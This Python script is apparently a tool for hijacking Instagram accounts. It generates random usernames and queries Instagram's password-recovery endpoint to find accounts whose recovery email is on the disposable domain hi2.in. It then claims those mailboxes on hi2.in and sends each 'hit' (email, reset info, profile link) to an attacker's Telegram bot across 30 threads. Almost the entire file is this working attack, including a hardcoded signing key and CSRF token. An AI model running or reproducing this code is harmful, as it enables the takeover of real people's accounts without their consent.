import os
import requests
import json
from threading import Thread, Lock
import random as rr
from random import choice as cc
from colorama import Fore, Style
import cfonts
from cfonts import render 
import random
import time
import requests
from datetime import datetime
import sys
import pytz

def check_expiration(github_raw_url):
    try:
        # Fetch the content from GitHub raw URL
        response = requests.get(github_raw_url)
        response.raise_for_status()
        
        # Get the expiration time from the file
        expiration_str = response.text.strip()
        expiration_time = datetime.strptime(expiration_str, "%Y-%m-%d %H:%M:%S")
        
        # Get current time (UTC)
        current_time = datetime.now(pytz.utc).replace(tzinfo=None)
        
        # Compare with current time
        if current_time > expiration_time:
            print("This tool has expired contact @boloradhey .")
            return False
        else:
            print(f"Tool is active. Expires on: {expiration_str}")
            return True
            
    except Exception as e:
        print(f"Error checking expiration: {e}")
        return False

def main():
    # Your GitHub raw URL pointing to a .txt file with the expiration time
    # Format in the file should be: YYYY-MM-DD HH:MM:SS
    EXPIRATION_FILE_URL = "https://raw.githubusercontent.com/wasradhey/Expiry/refs/heads/main/expiry.txt"
    
    if not check_expiration(EXPIRATION_FILE_URL):
        sys.exit(1)
    
    # Your main tool code goes here
    print("TOOL IS ALIVE RN")
    # ...

if __name__ == "__main__":
    main()
def random_color():
    return random.choice(['magenta','cyan','yellow','red','blue','green'])

def show_banner():
    A = render('RADHEY', font='block', colors=[random_color()], align='left', space=False)
    print(A)

show_banner()
time.sleep(1.5)

yy = 'abcdefghijklmnopqrstuvwxyz'
xx = 'abcdefghijklmnopqrstuvwxyz0123456789'

# Global variables
TOKEN = ""
ID = ""
used_names = set()
lock = Lock()
hits = 0
mail = 0
bdig = 0
good = 0
invalid_users = 0
last_stats = ""

def send_to_telegram(message):
    try:
        requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={
                'chat_id': ID,
                'text': message,
                'parse_mode': 'HTML'
            },
            timeout=10
        )
    except Exception as e:
        print(f"Telegram error: {e}")

def send_user_info(username, reset):
    global hits
    full_name = username.split("@")[0]
    sendhit = f'''
<b>#𝗛𝗜𝗧 𝗙𝗢𝗨𝗡𝗗</b>    
📧 <b>Email:</b> <code>{full_name}@hi2.in</code>
🔄 <b>Reset Info:</b> <code>{reset}</code>
🔗 <b>Profile:</b> instagram.com/{full_name}
'''
    with open('hits.txt', 'a') as file:
        file.write(f'{sendhit}\n')
    send_to_telegram(sendhit)

def verify_email(username, reset):
    global mail, hits
    full_name = username.split("@")[0]
    
    cookies = {
        '_ga': 'GA1.1.626396823.1754664400',
        '_ga_02VF9D5F26': 'GS2.1.s1754664400$o1$g0$t1754664400$j60$l0$h0',
    }
    
    headers = {
        'authority': 'hi2.in',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Basic bnVsbA==',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://hi2.in',
        'referer': 'https://hi2.in/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    
    data = {
        'domain': '@hi2.in',
        'prefix': f'{full_name}',
        'recaptcha': '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct',
    }
    
    try:
        response = requests.post('https://hi2.in/api/custom', cookies=cookies, headers=headers, data=data, timeout=15)
        result = response.json()
        
        if 'email' in result and 'expiry' in result:
            hits += 1
            send_user_info(username, reset)
        else:
            mail += 1
    except:
        mail += 1

def check_recovery(username):
    global bdig, good, invalid_users, last_stats
    try:
        headers = {
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        
        data = {
            'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","query":"{username}"}}',
            'ig_sig_key_version': '4',
        }
        
        response = requests.post(
            'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
            headers=headers,
            data=data,
            timeout=15
        )
        
        # Proper response handling
        if response.status_code == 200:
            result = response.json()
            if 'email' in result:
                recovery_email = result['email']
                new_stats = f'''\rHits: {hits} | Bad: {mail} | IG: {bdig} | Good: {good}\r'''
                
                if new_stats != last_stats:
                    print(new_stats)
                    last_stats = new_stats
                
                if username in recovery_email:
                    good += 1
                    verify_email(username, recovery_email)
                else:
                    bdig += 1
            else:
                bdig += 1
        else:
            bdig += 1
            
    except Exception as e:
        invalid_users += 1
        print(f"Error checking recovery: {str(e)}")

def generate_username():
    global used_names
    while True:
        first_part = cc(yy)
        second_part = cc(yy)
        middle_part = second_part * 2
        combo1 = first_part + cc(yy) + middle_part + cc(yy)
        combo2 = ''.join(cc(xx) for _ in range(5))
        combo3 = ''.join(cc(yy) for _ in range(6))
        combo4 = ''.join(cc(xx) for _ in range(7))

        username = cc([combo1, combo2, combo3, combo4])
        
        with lock:
            if username in used_names:
                continue
            used_names.add(username)
        
        email = username + '@hi2.in'
        check_recovery(email)

def main():
    global TOKEN, ID
    TOKEN = input("BOT TOKEN : ")
    ID = input("CHAT ID : ")
    for _ in range(30):
        Thread(target=generate_username).start()

if __name__ == "__main__":
    main()